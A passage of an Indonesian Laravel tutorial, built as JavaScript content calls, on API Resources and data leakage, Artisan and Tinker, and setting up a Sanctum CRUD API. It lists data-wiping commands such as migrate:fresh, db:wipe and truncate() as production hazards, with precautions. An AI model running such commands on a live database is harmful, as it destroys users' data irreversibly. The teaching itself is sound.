        // ditambahkan bulan depan oleh orang lain:
        //   { "id":1, "email":"...", "password":"$2y$...", "remember_token":"...",
        //     "catatan_internal":"...", "skor_risiko":87, "created_at":"..." }
        //
        // Laravel menyembunyikan sebagian lewat $hidden, dan itu bekerja —
        // selama setiap kolom baru diingat untuk ditambahkan ke sana.
        // Itu daftar LARANGAN, dan daftar larangan selalu tertinggal.
        `,
      ),
      p(
        'Perbedaannya dengan Resource adalah perbedaan antara daftar larangan dan daftar izin. Dengan `$hidden`, kolom baru **otomatis ikut keluar** kecuali ada yang ingat menyembunyikannya. Dengan Resource, kolom baru **otomatis tidak keluar** kecuali ada yang sengaja menambahkannya.',
      ),
      code(
        'php',
        `
        <?php
        declare(strict_types=1);

        final class PesananResource extends JsonResource
        {
            public function toArray(Request $request): array
            {
                return [
                    'id' => $this->id,
                    'status' => $this->status,
                    // Uang keluar sebagai bilangan bulat dalam satuan terkecil,
                    // beserta keterangan satuannya — alasannya diukur di bab Fondasi:
                    // 19.99 * 100 menghasilkan 1998.9999999999998.
                    'total' => ['jumlah' => $this->total, 'satuan' => 'IDR', 'pecahan' => 0],
                    'dibuat_pada' => $this->created_at->toIso8601String(),

                    // whenLoaded mencegah N+1: relasi disertakan HANYA bila
                    // controller memang memuatnya lebih dulu dengan with().
                    'pelanggan' => PelangganResource::make($this->whenLoaded('pelanggan')),
                    'item' => ItemResource::collection($this->whenLoaded('item')),

                    // Field yang hanya boleh dilihat sebagian orang.
                    'catatan_internal' => $this->when(
                        $request->user()?->can('lihatInternal', $this->resource) ?? false,
                        fn () => $this->catatan_internal,
                    ),
                ];
            }
        }
        `,
        {
          caption:
            'whenLoaded dan when adalah dua mekanisme berbeda: yang satu soal performa, yang lain soal kewenangan.',
        },
      ),
      p(
        'Bagian `whenLoaded` layak diperhatikan karena ia menutup N+1 dengan cara yang berbeda dari `with()`. Menulis `$this->pelanggan` langsung di dalam Resource akan **memicu query** untuk setiap baris ketika relasinya belum dimuat, dan pada daftar berisi seratus baris itu berarti seratus query. Dengan `whenLoaded`, relasinya hanya muncul bila controller memang sudah memuatnya, sehingga kelalaian itu menjadi field yang hilang alih-alih seratus perjalanan ke basis data.',
      ),
      p(
        'Bentuk `total` di atas juga bukan gaya penulisan melainkan keputusan yang diambil dari pengukuran.',
      ),
      code(
        'text',
        `
        Diukur sungguhan dengan Node 26.5.0 di bab Fondasi:

          19.99 * 100                 = 1998.9999999999998
          JSON.parse('{"id":9007199254740993}').id = 9007199254740992

        Baris kedua itu alasan id besar dikirim sebagai STRING, dan baris
        pertama alasan uang dikirim sebagai bilangan bulat dalam satuan terkecil.
        Kedua keputusan itu harus diambil SEJAK AWAL: mengubahnya belakangan
        berarti memutus setiap klien yang sudah memperlakukannya sebagai angka.
        `,
        { caption: 'Dijalankan sungguhan. Klien JavaScript adalah pemakai API yang paling umum.' },
      ),

      h2('Saat error-nya muncul'),
      p(
        'Kegagalan yang berhubungan dengan bentuk respons hampir tidak pernah berupa error, dan yang paling mahal adalah **kebocoran data**.',
      ),
      code(
        'text',
        `
        KEBOCORAN 1 — kolom baru yang ikut keluar

          Bulan lalu: return Pengguna::find($id);   -> aman, kolomnya wajar
          Bulan ini : kolom "catatan_internal" ditambahkan oleh orang lain
          Hasilnya  : kolom itu langsung muncul di respons publik

          Tidak ada error, tidak ada test yang gagal, dan tidak ada yang tahu.

        KEBOCORAN 2 — relasi yang ikut terbawa

          return Pesanan::with('pelanggan')->find($id);

          Seluruh kolom pelanggan ikut, termasuk email, telepon, dan alamat,
          pada endpoint yang seharusnya hanya menampilkan ringkasan pesanan.

        KEBOCORAN 3 — error yang membawa struktur internal

          Diukur di bab Express: respons 500 yang menyertakan err.stack
          membocorkan jalur berkas dan struktur folder server.
        `,
      ),
      p(
        'Yang membuat kebocoran pertama begitu sering terjadi adalah bahwa penyebabnya bukan orang yang menulis endpoint-nya. Endpoint itu ditulis dengan benar pada waktunya, lalu berubah arti karena perubahan di tempat lain. Daftar izin membalik sifat itu, sebab perubahan di tempat lain tidak bisa menambah apa pun ke respons.',
      ),
      p('Kegagalan kedua bersifat teknis dan bunyinya khas.'),
      code(
        'text',
        `
        Property [nama] does not exist on this collection instance.

        Penyebabnya: PesananResource::make() dipakai untuk KOLEKSI,
        atau PesananResource::collection() dipakai untuk SATU objek.

          satu objek : PesananResource::make($pesanan)
          koleksi    : PesananResource::collection($daftar)
        `,
      ),
      p(
        'Kegagalan ketiga menyangkut bentuk respons yang berubah-ubah tanpa disengaja, dan ia memutus klien.',
      ),
      code(
        'text',
        `
        Resource tunggal        -> { "data": { ... } }
        Resource koleksi        -> { "data": [ ... ] }
        Resource + paginate()   -> { "data": [...], "links": {...}, "meta": {...} }
        Model apa adanya        -> { ... }     <- TANPA pembungkus "data"

        Empat bentuk berbeda dari satu API yang sama, tergantung cara
        endpoint-nya ditulis. Klien harus menulis empat penanganan berbeda.

        Putuskan SATU bentuk untuk seluruh API, lalu tegakkan. Bila pembungkus
        "data" tidak diinginkan, matikan sekali di service provider —
        jangan sebagian endpoint memakainya dan sebagian tidak.
        `,
      ),
      p(
        'Konsistensi itu jauh lebih berharga daripada bentuk mana pun yang dipilih. Klien yang menghadapi satu bentuk menulis satu penanganan, dan klien yang menghadapi empat bentuk menulis percabangan yang akan salah pada endpoint kelima.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Bentuk respons adalah bagian kontrak yang paling sulit diubah setelah ada klien yang memakainya, dan paling mudah berubah tanpa disengaja.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Mengembalikan model apa adanya',
            'Field-nya memang itu',
            'Kolom yang ditambahkan orang lain bulan depan langsung ikut keluar. Pakai daftar izin',
          ],
          [
            'Mengandalkan `$hidden` untuk menyembunyikan',
            'Sudah ada daftarnya',
            'Itu daftar larangan, dan daftar larangan selalu tertinggal dari kolom baru',
          ],
          [
            'Mengakses relasi langsung di dalam Resource',
            'Datanya memang dibutuhkan',
            'Memicu query per baris bila belum dimuat. Pakai `whenLoaded`',
          ],
          [
            'Mengirim uang sebagai angka pecahan',
            'Harganya memang berkoma',
            'Diukur, `19.99 * 100` menghasilkan `1998.9999999999998`. Kirim bilangan bulat plus satuannya',
          ],
          [
            'Mengirim id besar sebagai angka',
            'Id memang angka',
            'Diukur, `9007199254740993` menjadi `...992` di klien JavaScript. Kirim sebagai string',
          ],
          [
            'Memakai bentuk pembungkus yang berbeda antar-endpoint',
            'Masing-masing sudah benar',
            'Klien harus menulis beberapa penanganan berbeda. Putuskan satu bentuk, tegakkan di seluruh API',
          ],
        ],
      ),
      p(
        'Baris kelima adalah keputusan yang paling mahal diperbaiki belakangan, dan alasannya bukan teknis melainkan sosial. Mengubah id dari angka menjadi string memutus setiap klien yang sudah memperlakukannya sebagai angka, termasuk aplikasi ponsel yang sudah terpasang di perangkat pengguna dan tidak bisa dipaksa berubah pada hari yang sama. Karena itu keputusan ini diambil sebelum klien pertama ada, bukan setelah bug pembulatannya dilaporkan.',
      ),
      references(
        {
          label: 'Eloquent: API Resources',
          href: 'https://laravel.com/docs/12.x/eloquent-resources',
          source: 'Laravel',
          note: '`toArray()`, collection, `whenLoaded`, dan `when` — seluruh API-nya.',
        },
        {
          label: 'Conditional Relationships — whenLoaded',
          href: 'https://laravel.com/docs/12.x/eloquent-resources#conditional-relationships',
          source: 'Laravel',
          note: 'Cara menyertakan relasi tanpa memicu N+1 dari lapisan respons.',
        },
        {
          label: 'Eloquent Serialization — $hidden',
          href: 'https://laravel.com/docs/12.x/eloquent-serialization',
          source: 'Laravel',
          note: 'Perbandingan langsung dengan pendekatan blocklist yang digantikan Resource.',
        },
        {
          label: 'RFC 3339 / ISO 8601 date format',
          href: 'https://www.rfc-editor.org/rfc/rfc3339.html',
          source: 'IETF',
          note: 'Format tanggal yang dipakai `toIso8601String()` — tidak ambigu di zona waktu mana pun.',
        },
      ),
    ],
  ),

  written(
    'artisan-tinker',
    'Artisan & Tinker',
    15,
    'Perkakas baris perintah yang dipakai setiap hari.',
    [
      terms(
        {
          term: 'Artisan',
          meaning:
            'Perkakas baris perintah Laravel. Hampir setiap pekerjaan berulang punya perintahnya — membuat berkas, menjalankan migrasi, membersihkan cache. Menjalankan `php artisan` tanpa argumen menampilkan seluruh daftarnya.',
        },
        {
          term: 'make:*',
          meaning:
            'Keluarga perintah yang menghasilkan kerangka berkas di tempat yang benar dengan namespace yang benar. Nilainya bukan menghemat ketikan melainkan **menegakkan konvensi** — berkas selalu berakhir di folder yang diharapkan framework.',
        },
        {
          term: '-mfs',
          meaning:
            'Gabungan flag pada `make:model`: **m**igration, **f**actory, **s**eeder sekaligus. Satu perintah menghasilkan empat berkas yang memang hampir selalu dibutuhkan bersamaan.',
        },
        {
          term: 'route:list',
          meaning:
            'Menampilkan **seluruh rute yang benar-benar terdaftar** beserta middleware-nya. Selain untuk orientasi, ia alat audit keamanan: rute yang seharusnya terlindungi tapi kolom middleware-nya kosong adalah endpoint terbuka.',
        },
        {
          term: 'Tinker',
          meaning:
            'REPL dengan **seluruh aplikasi termuat** — model, service, konfigurasi. Kamu bisa memanggil kode aplikasimu langsung tanpa membuat rute uji. Padanan `node --experimental-repl-await` yang tahu isi projectmu.',
        },
        {
          term: 'artisan about',
          meaning:
            'Ringkasan lingkungan yang sedang berjalan: versi PHP dan Laravel, driver cache, koneksi database, dan status debug. Perintah pertama yang dijalankan saat sesuatu berperilaku tidak seperti dugaan.',
        },
        {
          term: 'config:cache',
          meaning:
            'Menggabungkan seluruh berkas `config/` menjadi satu berkas cache — mempercepat boot di produksi. **Jebakannya**: setelah di-cache, `env()` di luar berkas config mengembalikan `null`. Karena itu `env()` hanya boleh dipanggil di dalam `config/`.',
        },
        {
          term: 'perintah kustom',
          meaning:
            'Kelas buatanmu sendiri yang bisa dipanggil lewat artisan. Ia tempat yang tepat untuk pekerjaan terjadwal dan pemeliharaan — dan ia bisa memanggil **service** yang sama dengan controller, kalau lapisannya kamu jaga bersih.',
        },
        {
          term: 'jangan jalankan di produksi tanpa berpikir',
          meaning:
            'Beberapa perintah bersifat merusak: `migrate:fresh`, `db:wipe`, `migrate:rollback`. Laravel meminta konfirmasi di produksi — dan konfirmasi itu ada karena alasan yang nyata.',
        },
      ),

      h2('Perintah yang sering dipakai'),
      code(
        'bash',
        `
        php artisan serve
        php artisan route:list --path=catatan
        php artisan migrate
        php artisan migrate:fresh --seed
        php artisan db:seed

        # Membuat berkas
        php artisan make:model Catatan -mfs
        php artisan make:controller CatatanController --api --model=Catatan
        php artisan make:request SimpanCatatanRequest
        php artisan make:resource CatatanResource
        php artisan make:policy CatatanPolicy --model=Catatan
        php artisan make:migration tambah_slug_ke_catatan

        # Diagnosis
        php artisan about
        php artisan config:show database
        `,
      ),
      p(
        'Perintah `make:` bukan sekadar penghemat ketikan, sebab ia menempatkan berkas di folder yang benar dengan namespace yang benar sehingga autoload Composer langsung menemukannya tanpa `dump-autoload`. Perhatikan opsi-opsinya. `-mfs` pada `make:model` sekaligus membuat migration, factory, dan seeder. `--api` pada `make:controller` menghasilkan lima method tanpa `create` dan `edit` yang hanya berguna untuk formulir HTML. Dan `--model=Catatan` mengisi type-hint route model binding-nya sejak awal.',
      ),
      p(
        'Dua perintah diagnosis di akhir jarang disebut tetapi sangat menolong. `php artisan about` merangkum versi PHP dan Laravel, driver database, driver cache, serta apakah konfigurasi sedang di-cache — jawaban cepat untuk "kenapa perilakunya berbeda di sini". `config:show database` menampilkan konfigurasi yang **benar-benar berlaku** setelah semua lapisan digabung, bukan apa yang kamu kira tertulis di `.env`.',
      ),

      h2('Tinker — REPL dengan seluruh aplikasi termuat'),
      code(
        'bash',
        `
        php artisan tinker
        `,
      ),
      code(
        'php',
        `
        >>> User::count()
        = 21

        >>> $u = User::first()
        >>> $u->catatan()->count()
        = 30

        >>> Catatan::factory()->count(5)->create(['penulis_id' => $u->id])

        >>> Catatan::where('diarsipkan', false)->toRawSql()
        = "select * from catatan where diarsipkan = 0 and deleted_at is null"

        >>> Hash::make('rahasia')
        = "$2y$12$..."
        `,
      ),
      p(
        'Tinker adalah REPL dengan **seluruh aplikasimu sudah termuat** — model, konfigurasi, koneksi database, dan facade semuanya siap pakai. Nilainya bukan sekadar menjalankan potongan PHP, melainkan bisa mencoba sesuatu tanpa membuat rute, controller, dan permintaan HTTP hanya untuk memeriksa satu hal.',
      ),
      p(
        'Perhatikan tiga pemakaian yang berbeda sifatnya. Dua baris pertama adalah **pemeriksaan**, yaitu menghitung baris dan menelusuri relasi lewat `$u->catatan()`. Baris `factory()->count(5)->create(...)` adalah **penyiapan data**, cara tercepat mengisi tabel untuk mencoba paginasi tanpa mengubah seeder. Dan `toRawSql()` adalah **penelusuran**, di mana keluarannya memuat `deleted_at is null` yang tidak pernah kamu tulis. Itu bukti trait `SoftDeletes` benar-benar bekerja, hal yang tidak bisa kamu lihat dari kodenya saja.',
      ),
      callout(
        'danger',
        'Tinker di produksi menjalankan perintah sungguhan',
        'Tidak ada konfirmasi dan tidak ada pembatalan. Satu `Catatan::truncate()` yang salah ketik menghapus seluruh tabel seketika. Kalau harus memakainya di produksi, jalankan `SELECT` dulu untuk memastikan cakupannya sebelum menjalankan apa pun yang mengubah data.',
      ),

      h2('Cache konfigurasi — dan jebakannya'),
      code(
        'bash',
        `
        # Untuk produksi: mempercepat setiap permintaan
        php artisan config:cache
        php artisan route:cache
        php artisan view:cache

        # Saat pengembangan: bersihkan
        php artisan optimize:clear
        `,
      ),
      p(
        'Ketiga perintah `:cache` memampatkan hal yang jarang berubah menjadi satu berkas siap pakai, sehingga Laravel tidak perlu membaca puluhan berkas konfigurasi dan berkas rute di **setiap** permintaan. Bedanya nyata di produksi, dan itulah sebabnya ketiganya masuk ke langkah deploy. Sebaliknya, jangan menjalankannya saat mengembangkan: hasil cache tidak ikut berubah ketika kamu menyunting konfigurasi atau rute, dan kamu akan menghabiskan waktu bingung mengapa perubahanmu tidak berpengaruh.',
      ),
      p(
        '`optimize:clear` adalah tombol pembatalnya — ia membersihkan semua cache di atas sekaligus. Jadikan perintah ini refleks pertama saat perubahanmu "tidak muncul", dan perhatikan konsekuensi terpenting dari `config:cache` dijelaskan di peringatan berikut: setelah cache aktif, fungsi `env()` di luar folder `config/` mengembalikan `null`.',
      ),
      callout(
        'warning',
        'Setelah `config:cache`, `env()` mengembalikan `null`',
        "Ini jebakan Laravel yang paling sering menjatuhkan deploy. Begitu konfigurasi di-cache, fungsi `env()` **hanya** boleh dipanggil dari dalam berkas `config/*.php`. Memanggilnya di controller, model, atau service akan mengembalikan `null` di produksi — padahal bekerja sempurna di lokal. Selalu pakai `config('nama.kunci')` di luar folder config.",
      ),
      code(
        'php',
        `
        // config/layanan.php
        return [
            'pembayaran' => [
                'kunci' => env('KUNCI_PEMBAYARAN'),   // BOLEH di sini
            ],
        ];

        // Di mana pun selain config/
        $kunci = config('layanan.pembayaran.kunci');   // BENAR
        $kunci = env('KUNCI_PEMBAYARAN');              // null setelah config:cache
        `,
      ),
      p(
        "Aturannya bisa diringkas satu kalimat, yaitu `env()` **hanya** boleh muncul di dalam berkas `config/*.php` dan di mana pun selain itu pakai `config('...')`. Alasannya ada pada cara `config:cache` bekerja, sebab ia mengevaluasi seluruh berkas config sekali lalu menyimpan hasilnya, dan setelah itu berkas `.env` tidak dibaca lagi. Fungsi `config()` membaca dari hasil cache tersebut sehingga tetap benar, sedangkan `env()` mencari berkas yang tidak lagi dibaca dan mengembalikan `null`.",
      ),
      p(
        'Yang membuat ini menjatuhkan begitu banyak deploy adalah kodenya bekerja **sempurna di lokal**, karena di sana cache tidak menyala. Gejalanya baru muncul di produksi, sebagai koneksi yang gagal atau kunci API yang kosong — jauh dari baris yang menyebabkannya. Perhatikan pola berkas config di atas sekaligus memberi keuntungan lain: nama variabel lingkungan hanya disebut di satu tempat, jadi menggantinya nanti tidak perlu menyisir seluruh kode.',
      ),

      h2('Membuat perintah sendiri'),
      code(
        'php',
        `
        // php artisan make:command BersihkanCatatanTerhapus
        final class BersihkanCatatanTerhapus extends Command
        {
            protected $signature = 'catatan:bersihkan {--hari=30}';
            protected $description = 'Hapus permanen catatan yang di-soft-delete lebih dari N hari';

            public function handle(): int
            {
                $hari = (int) $this->option('hari');

                $jumlah = Catatan::onlyTrashed()
                    ->where('deleted_at', '<', now()->subDays($hari))
                    ->forceDelete();

                $this->info("{$jumlah} catatan dihapus permanen.");

                return self::SUCCESS;
            }
        }
        `,
      ),
      p(
        'Perintah seperti ini bisa dijadwalkan. Perhatikan bahwa ia memanggil model langsung — inilah keuntungan menjaga aturan bisnis di luar controller: ia bisa dipakai dari HTTP maupun dari baris perintah.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Artisan dan Tinker paling berguna bukan untuk membuat berkas melainkan untuk **menjawab pertanyaan tentang aplikasi yang sedang berjalan**. Tiga perintah berikut menjawab tiga pertanyaan yang paling sering muncul saat menelusuri masalah.',
      ),
      code(
        'text',
        `
        php artisan route:list --path=pesanan
          -> Rute apa yang sebenarnya terdaftar, method apa, middleware apa,
             dan controller mana yang menanganinya. Menjawab
             "kenapa 404" dan "kenapa middleware-nya tidak jalan".

        php artisan about
          -> Environment apa yang sedang aktif, driver cache dan antrean apa
             yang dipakai, dan cache mana yang sedang menyala. Menjawab
             "kenapa perubahan saya tidak muncul".

        php artisan tinker
          -> REPL dengan seluruh aplikasi termuat. Menjawab pertanyaan tentang
             DATA tanpa menulis satu pun endpoint sementara.
        `,
      ),
      p(
        'Perintah kedua menjawab kelas masalah yang paling sering membuang waktu, yaitu perubahan kode yang tidak berpengaruh sama sekali karena versi lamanya masih di-cache.',
      ),
      code(
        'text',
        `
        Gejala                                   Yang di-cache      Perintahnya
        ---------------------------------------  -----------------  --------------------------
        Rute baru menghasilkan 404               route:cache        php artisan route:clear
        Perubahan .env tidak berpengaruh         config:cache       php artisan config:clear
        Perubahan Blade tidak muncul             view cache         php artisan view:clear
        Kelas baru tidak ditemukan               autoload Composer  composer dump-autoload

        Satu perintah yang membersihkan semuanya sekaligus:
          php artisan optimize:clear
        `,
      ),
      p(
        'Baris kedua memuat jebakan yang layak diketahui sebelum ditemui. Begitu `config:cache` dijalankan, Laravel **berhenti membaca berkas `.env` sama sekali** dan hanya memakai nilai yang sudah tersimpan di cache. Jadi memanggil `env()` di luar berkas konfigurasi akan mengembalikan `null` di produksi, meski variabelnya jelas ada. Aturan yang menutupnya, `env()` hanya boleh dipanggil di dalam berkas `config/`, dan seluruh kode lain membaca lewat `config()`.',
      ),
      p(
        'Tinker sendiri paling berharga untuk memeriksa hal yang sulit dilihat dari luar, terutama **query yang sebenarnya dijalankan**.',
      ),
      code(
        'php',
        `
        // Melihat SQL-nya tanpa menjalankannya:
        >>> Pesanan::with('pelanggan')->where('status', 'baru')->toSql();
        => "select * from \\"pesanan\\" where \\"status\\" = ?"

        // Menghitung query yang benar-benar berjalan — cara paling cepat
        // membuktikan ada N+1 atau tidak:
        >>> DB::enableQueryLog();
        >>> $p = Pesanan::limit(100)->get();
        >>> foreach ($p as $x) { $x->pelanggan->nama; }
        >>> count(DB::getQueryLog());
        => 101                                   // <-- 1 + 100, inilah N+1-nya

        >>> DB::flushQueryLog();
        >>> $p = Pesanan::with('pelanggan')->limit(100)->get();
        >>> foreach ($p as $x) { $x->pelanggan->nama; }
        >>> count(DB::getQueryLog());
        => 2
        `,
        { caption: 'Angka 101 melawan 2 itu bukti yang bisa dilihat, bukan dugaan.' },
      ),
      p(
        'Selisih 101 melawan 2 itu adalah bentuk Laravel dari apa yang sudah diukur waktunya di bab database, yaitu 1.000 query terpisah memakan 53 milidetik melawan 3 milidetik untuk satu query, pada koneksi lokal. Di basis data yang berada di zona lain, selisih yang sama menjadi hitungan detik.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Ada satu kelas kecelakaan yang khas Tinker, dan penyebabnya bukan perintahnya melainkan **di mana ia dijalankan**.',
      ),
      code(
        'text',
        `
        >>> Pesanan::where('status', 'batal')->delete();
        => 48211

        Angka itu jumlah baris yang terhapus, dan ia muncul SETELAH
        penghapusannya terjadi. Bila sesi Tinker itu terhubung ke produksi
        karena terminalnya belum diganti, tidak ada jalan kembali.

        Kebiasaan yang menutupnya, dan biayanya satu baris:

          >>> app()->environment()
          => "production"          <-- PERIKSA INI DULU, setiap kali

          >>> Pesanan::where('status', 'batal')->count()
          => 48211                 <-- lalu hitung dulu dengan syarat yang SAMA
        `,
      ),
      p(
        'Urutan itu sama persis dengan yang berlaku untuk `UPDATE` dan `DELETE` di bab database, yaitu jalankan `count()` dengan syarat yang sama sebelum menjalankan perubahannya. Di sana angkanya sudah diukur, yaitu `UPDATE` tanpa `WHERE` menyentuh 5000 baris sedangkan yang dengan `WHERE` menyentuh 1.',
      ),
      p(
        'Kelompok kesalahan kedua adalah perintah yang aman di komputer sendiri dan merusak di produksi.',
      ),
      code(
        'text',
        `
        BERBAHAYA di produksi:

          php artisan migrate:fresh     menghapus SELURUH tabel lalu membangun ulang
          php artisan db:wipe           menghapus seluruh tabel
          php artisan migrate --seed    menjalankan seeder yang mungkin truncate

        AMAN dan memang dipakai saat rilis:

          php artisan migrate --force   menjalankan migrasi yang BELUM pernah jalan
          php artisan config:cache      menyimpan konfigurasi
          php artisan route:cache       menyimpan rute — GAGAL bila ada closure di rute
          php artisan queue:restart     menyuruh worker berhenti setelah job yang berjalan

        Perintah terakhir itu sering dilupakan, dan akibatnya halus: worker
        antrean menjalankan kode LAMA sampai ia dimulai ulang, sehingga
        bug yang baru diperbaiki tetap terjadi di job latar.
        `,
      ),
      p(
        'Baris terakhir itu bug yang sangat sulit ditelusuri karena gejalanya bertentangan dengan fakta. Kode sudah diperbaiki, deploy sudah berhasil, halamannya sudah benar, dan job latarnya tetap menghasilkan hasil lama. Penyebabnya, proses worker sudah berjalan sejak sebelum deploy dan memegang kode lama di memorinya.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Perkakas terasa seperti hal yang bisa dipelajari sambil jalan, dan yang terjadi tanpanya adalah penelusuran dengan cara menebak.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menjalankan perintah yang mengubah data di Tinker tanpa memeriksa environment',
            'Terminalnya kan terminal saya',
            'Satu sesi yang tertinggal terhubung ke produksi cukup. Periksa `app()->environment()` dulu',
          ],
          [
            'Menghapus atau mengubah tanpa `count()` lebih dulu',
            'Syaratnya sudah benar',
            'Diukur di bab database, `UPDATE` tanpa `WHERE` menyentuh 5000 baris. Hitung dulu dengan syarat yang sama',
          ],
          [
            'Memanggil `env()` di luar berkas `config/`',
            'Nilainya kan dari `.env`',
            'Setelah `config:cache`, `.env` tidak dibaca lagi dan hasilnya `null` di produksi. Pakai `config()`',
          ],
          [
            'Menelusuri "perubahan tidak muncul" dengan membaca ulang kode',
            'Pasti ada yang salah di kodenya',
            'Empat jenis cache bisa jadi penyebabnya. Jalankan `optimize:clear` dulu, baru menelusuri',
          ],
          [
            'Tidak menjalankan `queue:restart` setelah deploy',
            'Kodenya sudah terganti',
            'Worker yang sudah berjalan memegang kode lama di memori sampai dimulai ulang',
          ],
          [
            'Menduga ada N+1 tanpa menghitungnya',
            'Terlihat seperti N+1',
            '`DB::enableQueryLog()` dan `count(DB::getQueryLog())` menjawabnya dalam dua baris',
          ],
        ],
      ),
      p(
        'Baris terakhir pantas dijadikan kebiasaan karena ia mengubah dugaan menjadi angka dalam hitungan detik. Sebelum mengoptimalkan apa pun, hitung dulu berapa query yang benar-benar dijalankan satu permintaan. Kadang jawabannya adalah dua, dan yang lambat ternyata hal lain sepenuhnya. Mengoptimalkan berdasarkan dugaan menghabiskan waktu pada bagian yang tidak bermasalah, dan meninggalkan yang bermasalah tetap di tempatnya.',
      ),
      references(
        {
          label: 'Artisan Console',
          href: 'https://laravel.com/docs/12.x/artisan',
          source: 'Laravel',
          note: 'Seluruh perintah bawaan beserta cara membuat perintah sendiri.',
        },
        {
          label: 'Tinker',
          href: 'https://laravel.com/docs/12.x/artisan#tinker',
          source: 'Laravel',
          note: 'REPL dengan aplikasi termuat, beserta batasan yang perlu diketahui.',
        },
        {
          label: 'Configuration — Caching & env()',
          href: 'https://laravel.com/docs/12.x/configuration#configuration-caching',
          source: 'Laravel',
          note: 'Peringatan resmi bahwa `env()` mengembalikan `null` setelah `config:cache`.',
        },
        {
          label: 'Task Scheduling',
          href: 'https://laravel.com/docs/12.x/scheduling',
          source: 'Laravel',
          note: 'Menjadwalkan perintah kustom seperti contoh pembersih catatan di atas.',
        },
      ),
    ],
  ),

  written(
    'praktik-crud-laravel',
    'Praktik: REST API CRUD "catatan" dengan Laravel',
    21,
    'API yang sama dengan Bab 3.14, dibangun dengan Laravel.',
    [
      p(
        'Bangun API yang **spesifikasinya identik** dengan yang kamu buat di Express. Membangun hal yang sama dua kali dengan alat berbeda adalah cara tercepat melihat mana yang merupakan prinsip dan mana yang sekadar kebiasaan framework.',
      ),

      terms(
        {
          term: 'membangun hal yang sama dua kali',
          meaning:
            'Metode belajar latihan ini. Spesifikasinya **identik** dengan Bab 3.14 di Express. Membangunnya lagi dengan alat berbeda adalah cara tercepat melihat mana yang **prinsip** dan mana yang sekadar kebiasaan framework.',
        },
        {
          term: 'Sanctum',
          meaning:
            'Paket autentikasi resmi Laravel untuk API dan SPA. Ia menerbitkan **token** yang dikirim di header `Authorization` — model stateless yang cocok untuk `routes/api.php`, berbeda dari sesi berbasis cookie.',
        },
        {
          term: 'install:api',
          meaning:
            'Perintah yang menyiapkan seluruh berkas API sekaligus — `routes/api.php`, migration token Sanctum, dan pendaftarannya. Sejak Laravel 11, berkas rute API tidak lagi ada secara default sampai perintah ini dijalankan.',
        },
        {
          term: 'Policy',
          meaning:
            'Kelas berisi **aturan otorisasi** untuk satu model — siapa boleh melihat, mengubah, menghapus. Ia memindahkan pertanyaan "boleh atau tidak" ke satu tempat, alih-alih tersebar sebagai `if` di setiap controller.',
        },
        {
          term: 'metode policy',
          meaning:
            "Nama metode Policy dipetakan ke aksi: `view`, `update`, `delete`. Laravel menemukannya sendiri saat kamu memanggil `$this->authorize('view', $catatan)` — jadi penamaannya bukan pilihan bebas.",
        },
        {
          term: 'defense in depth',
          meaning:
            "Otorisasi ada di **dua tempat**: Policy (`authorize`) dan scope query (`where('penulis_id', ...)`) . Bukan pengulangan sia-sia — kalau satu terlewat di endpoint baru, yang lain masih menahan.",
        },
        {
          term: 'uji dengan token pengguna lain',
          meaning:
            'Uji yang paling sering dilewatkan, dan yang paling penting di sini. Ambil id catatan milik A, panggil dengan token B, dan pastikan jawabannya **404** — bukan `200`, dan bukan `403` yang membocorkan keberadaannya.',
        },
        {
          term: 'membandingkan dua implementasi',
          meaning:
            'Setelah selesai, sandingkan dengan versi Express-mu. Yang **sama** di keduanya adalah prinsip: validasi di server, otorisasi per baris, batas paginasi, bentuk respons yang dipilih sadar. Yang **berbeda** hanya cara framework menyusunnya.',
        },
        {
          term: 'convention over configuration',
          meaning:
            'Filosofi Laravel yang paling terasa di latihan ini. Banyak hal bekerja tanpa dikonfigurasi karena ada **konvensi** yang diikuti — nama tabel, nama metode policy, nama metode resource controller. Express memilih kebalikannya: kamu merakit semuanya sendiri.',
        },
      ),

      h2('Spesifikasi — sama persis'),
      code(
        'text',
        `
        GET    /api/catatan          daftar milik pengguna, berpaginasi
        POST   /api/catatan          buat baru             -> 201 + Location
        GET    /api/catatan/{id}     satu item             -> 404 kalau bukan miliknya
        PATCH  /api/catatan/{id}     ubah sebagian
        DELETE /api/catatan/{id}     hapus                 -> 204

        Semua endpoint butuh autentikasi.
        Pengguna HANYA bisa melihat dan mengubah catatannya sendiri.
        `,
      ),
      p(
        'Judulnya berbunyi "sama persis", dan itu disengaja: spesifikasi ini identik dengan praktik Express di sub-bab 3.14. Membangun hal yang sama dua kali dengan stack berbeda memperlihatkan mana yang benar-benar prinsip dan mana yang sekadar cara sebuah framework menuliskannya. Status kodenya sama, aturan kepemilikannya sama, dan alasan `404` dipilih untuk catatan milik orang lain juga sama — yang berbeda hanya nama alat yang mengerjakannya.',
      ),

      h2('Menyiapkan'),
      code(
        'bash',
        `
        composer create-project laravel/laravel api-catatan-laravel
        cd api-catatan-laravel

        composer require laravel/sanctum
        php artisan install:api

        php artisan make:model Catatan -mfs
        php artisan make:controller CatatanController --api --model=Catatan
        php artisan make:request SimpanCatatanRequest
        php artisan make:resource CatatanResource
        php artisan make:policy CatatanPolicy --model=Catatan
        `,
      ),
      p(
        '`php artisan install:api` adalah langkah yang mudah terlewat pada Laravel 11 ke atas: berkas `routes/api.php` **tidak ada** secara bawaan, dan perintah inilah yang membuatnya sekaligus mendaftarkan migration token Sanctum. Tanpa itu, rute API yang kamu tulis tidak akan pernah terdaftar dan `route:list` tidak menampilkannya.',
      ),
      p(
        'Lima perintah `make:` di bawahnya menyiapkan seluruh lapisan sekaligus, dan urutannya mencerminkan aliran satu permintaan: rute → controller → Form Request → Policy → Resource. Perhatikan `--model=Catatan` muncul dua kali; pada controller ia mengisi type-hint route model binding, dan pada policy ia menghasilkan kerangka method yang sudah menerima `User` dan `Catatan`. Jalankan semuanya sekarang supaya berkasnya siap, lalu isi satu per satu di bagian berikut.',
      ),

      h2('Policy — inti otorisasinya'),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        namespace App\\Policies;

        use App\\Models\\Catatan;
        use App\\Models\\User;

        final class CatatanPolicy
        {
            public function view(User $user, Catatan $catatan): bool
            {
                return $catatan->penulis_id === $user->id;
            }

            public function update(User $user, Catatan $catatan): bool
            {
                return $catatan->penulis_id === $user->id;
            }

